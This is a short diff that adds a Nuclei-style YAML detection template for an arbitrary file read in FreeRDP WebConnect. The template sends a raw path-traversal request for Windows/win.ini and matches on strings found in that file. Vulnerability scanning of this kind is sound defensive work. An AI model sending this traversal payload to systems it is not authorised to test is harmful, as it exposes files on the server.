@@ -1,0 +1,17 @@
+id: freerdp-webconnect-fileread
+
+info:
+  name: FreeRDP WebConnect Url 任意文件读取
+  author: SleepingBag945
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /../../../../../../../../Windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,"for 16-bit app support","fonts")
